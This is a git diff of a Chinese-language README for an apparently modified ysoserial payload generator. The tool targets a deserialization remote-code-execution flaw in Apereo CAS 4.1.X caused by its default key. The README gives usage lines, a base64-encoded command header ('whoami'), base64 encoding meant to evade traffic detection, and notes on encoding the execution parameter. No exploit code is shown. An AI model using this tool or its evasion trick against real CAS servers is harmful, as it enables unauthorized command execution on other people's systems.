@@ -1,8 +1,9 @@
-# 修改ysoserial CommonsCollections2用于ApereoCAS 4.1.X 使用默认密钥导致的反序列化漏洞回显复现
+# ApereoCAS 4.1.X 使用默认密钥导致的反序列化漏洞回显复现
 
 ## 0x01 Introduce
 
-1. 回显
+1. Request/Response回显
+2. 支持win和linux payload
 2. 简单使用base64防止流量检测
 
 ## 0x02 Buiding
@@ -13,19 +14,19 @@
 
 ```
 Usage: java -jar yso-apereoCAS-all.jar [payload] [platform]
-Usage: java -jar yso-apereoCAS-all.jar [payload] "win"
-Usage: java -jar yso-apereoCAS-all.jar [payload] "linux"
+Usage: java -jar yso-apereoCAS-all.jar CommonsCollections2_apereo "win"
+Usage: java -jar yso-apereoCAS-all.jar CommonsCollections2_apereo "linux"
+
 [Add Request Header] Reqstr: d2hvYW1p (whoami)
-  Available payload types:
-     Payload                                  Authors  Dependencies
-     -------                                     -------   ------------
-     CommonsCollections2_apereo            commons-collections4:4.0
+
+execution参数下划线后进行Url encode key characters
+3ce72aed-749b-4003-90a3-ea5ac52368fc_AAAAIgAAABByQvrQ..............
 ```
 
 ## 0x04 Screenshot
-![Screenshot.png](.\Screenshot.png)
+![Screenshot.png](./Screenshot.png)
 
-## 0x04 Reference
+## 0x05 Reference
 * https://github.com/frohoff/ysoserial
 * https://www.freebuf.com/vuls/226149.html
 * https://www.00theway.org/2020/01/04/apereo-cas-rce/
